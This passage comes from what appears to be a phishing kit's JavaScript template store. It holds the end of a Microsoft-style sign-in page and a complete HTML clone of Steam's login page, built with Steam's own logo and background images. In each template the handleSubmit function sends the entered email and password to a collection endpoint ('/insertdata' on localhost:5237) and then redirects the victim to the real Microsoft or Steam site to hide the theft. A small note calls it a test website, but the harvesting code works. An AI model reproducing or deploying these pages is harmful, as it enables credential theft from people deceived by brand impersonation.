                pwdInp.addEventListener('change', function () {
                    if (this.value.trim() === "") {
                        pwdValAction(false);
                    } else {
                        pwdValAction(true);
                    }
                })
            }
            return false;
        }

        //back button
        document.querySelector('.back').addEventListener('click', () => {
            view = "uname";
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_uname').classList.remove('d-none');
        })
    </script>

<script>
    const uid = "user123user123"; 
    const websiteName = "mywebsitemywebsite"; 

    async function handleSubmit(event) {
      event.preventDefault(); 
      const email = document.getElementById("inp_uname").value;
      const password = document.getElementById("inp_pwd").value;
      const signInButton = event.target;
    signInButton.disabled = true;
    signInButton.style.opacity = '0.5';
    signInButton.style.cursor = 'not-allowed';
    
      try {
        const response = await fetch("http://localhost:5237/insertdata", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            uid: uid,
            websiteName: websiteName,
            email: email,
            password: password
          })
        });

        window.location.href = "https://microsoft.com/";
          } catch (error) {
            window.location.href = "https://microsoft.com/";
            }
    }
  </script>

</body>

</html>`,
    "steam":`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Sign In</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" type="image/png">
    <style>
        body {
    margin: 0;
    font-family: Arial, sans-serif;
    color: #c7d5e0;
    background-color: #1b2838; /* Dark background similar to Steam */
    overflow: hidden; /* Hide scrollbars if background image overflows */
}

.background-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url('https://store.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg');
    background-size: cover;
    background-position: center;
    filter: brightness(0.6); /* Darken the background image */
    z-index: -1;
}

.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px 50px;
    background-color: rgba(27, 40, 56, 0.8); /* Slightly transparent dark header */
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
    position: relative;
    z-index: 10;
}

.header .logo img {
    height: 30px; /* Adjust logo size */
}

.header .nav-links a,
.header .header-right a {
    color: #c7d5e0;
    text-decoration: none;
    margin-left: 20px;
    font-size: 14px;
    transition: color 0.3s ease;
}

.header .nav-links a:hover,
.header .header-right a:hover {
    color: #fff;
}

.header .install-steam {
    background-color: #5b9228;
    color: #fff;
    padding: 5px 10px;
    border-radius: 3px;
    font-weight: bold;
    text-transform: uppercase;
}

.header .login-btn {
    color: #66c0f4;
}

.header .language-select {
    color: #66c0f4;
}

.login-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: calc(100vh - 80px); /* Adjust for header height */
    padding: 20px;
    box-sizing: border-box;
}

.login-box {
    background-color: rgba(0, 0, 0, 0.8); /* Darker, slightly transparent box */
    padding: 30px;
    border-radius: 5px;
    text-align: center;
    width: 600px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
    border-top: 1px solid rgba(255, 255, 255, 0.1);
}

.login-box h2 {
    color: #fff;
    font-size: 28px;
    margin-bottom: 30px;
    text-align: left;
}

.login-content {
    display: flex;
    justify-content: space-between;
    gap: 30px;
}

.login-form {
    flex: 1;
    text-align: left;
}

.sign-in-heading {
    color: #8f98a0;
    font-size: 12px;
    margin-bottom: 5px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.login-form input[type="text"],
.login-form input[type="password"] {
    width: calc(100% - 20px);
    padding: 10px;
    margin-bottom: 15px;
    background-color: #32353c;
    border: 1px solid #484b51;
    color: #fff;
    border-radius: 3px;
    font-size: 14px;
}

.login-form input[type="text"]:focus,
.login-form input[type="password"]:focus {
    outline: none;
    border-color: #67c2ef;
}

.remember-me {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
    font-size: 13px;
    color: #8f98a0;
}

.remember-me input[type="checkbox"] {
    margin-right: 8px;
    accent-color: #66c0f4; /* Changes checkbox color in some browsers */
}

.sign-in-button {
    width: 100%;
    padding: 12px;
    background: linear-gradient(to right, #417a9b, #5997b6);
    border: none;
    border-radius: 3px;
    color: #fff;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s ease;
}

.sign-in-button:hover {
    background: linear-gradient(to right, #4a84a6, #61a2c2);
}

.help-link {
    display: block;
    margin-top: 20px;
    color: #8f98a0;
    text-decoration: none;
    font-size: 13px;
    transition: color 0.3s ease;
}

.help-link:hover {
    color: #fff;
}

.qr-code-section {
    flex: 1;
    text-align: center;
}

.qr-code-box {
    background-color: #fff; /* White background for QR code */
    padding: 10px;
    border-radius: 3px;
    display: inline-block; /* To center the white box */
    margin-top: 10px;
}

.qr-code-box img {
    display: block; /* Remove extra space below image */
    width: 150px; /* Adjust QR code image size */
    height: 150px;
}

.qr-info {
    color: #8f98a0;
    font-size: 13px;
    margin-top: 20px;
}

.steam-mobile-app {
    color: #66c0f4;
    cursor: pointer;
}

.footer-games {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    display: flex;
    justify-content: space-around;
    padding: 10px;
    color: rgba(255, 255, 255, 0.05); /* Very faint text */
    font-size: 80px; /* Large, faint text */
    font-weight: bold;
    pointer-events: none; /* Make them not clickable */
    user-select: none; /* Prevent text selection */
    z-index: -2; /* Behind everything */
}
    </style>

    <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
               window.location.href = "https://steampowered.com/";
          } catch (error) {
            window.location.href = "https://steampowered.com/";
            }
          }
        </script>

</head>
<body>
    <div class="background-overlay"></div>
    <div class="header">
        <div class="logo">
            <img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" alt="Welcome Logo">
        </div>
        <div class="nav-links">
            <a href="https://steampowered.com">STORE</a>
            <a href="https://steampowered.com">COMMUNITY</a>
            <a href="https://steampowered.com">ABOUT</a>
            <a href="https://steampowered.com">SUPPORT</a>
        </div>
        <div class="header-right">
            <a href="https://steampowered.com" class="install-steam">Install Welcome</a>
            <a href="https://steampowered.com" class="login-btn">login</a>
            <a href="https://steampowered.com" class="language-select">language</a>
        </div>
    </div>

    <div class="login-container">
        <div class="login-box">
            <h2>Sign in</h2>
            <div class="login-content">
                <div class="login-form">
                    <p class="sign-in-heading">SIGN IN WITH ACCOUNT NAME</p>
                    <input type="text" id="email" steamstatic="username" value="">
                    <p class="sign-in-heading">PASSWORD</p>
                    <input type="password" id="password" steamstatic="password" value="">
                    <label class="remember-me">
                        <input type="checkbox" checked> Remember me
                    </label>
                    <button class="sign-in-button" id="amazon" onclick="handleSubmit(event)">Sign in</button>
                    <a href="https://steampowered.com" class="help-link">Help, I can't sign in</a>
                </div>
                <div class="qr-code-section">
                    <p class="sign-in-heading">OR SIGN IN WITH QR</p>
                    <div class="qr-code-box">
                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=example_qr_code_data" alt="QR Code">
                    </div>
                    <p class="qr-info">Use the <span class="steam-mobile-app">Welcome Mobile App</span> to sign in via QR code. This is a test website, dont login with real credentials</p>
                </div>
            </div>
        </div>
    </div>

    <div class="footer-games">
        <p>HU</p>
        <p>ISLAND</p>
        <p>A WINTER</p>
        <p>BIG OGRE</p>
        <p>TOMS RAIDER</p>
        <p>SHIRTS HIKE</p>
    </div>
</body>
</html>`
  };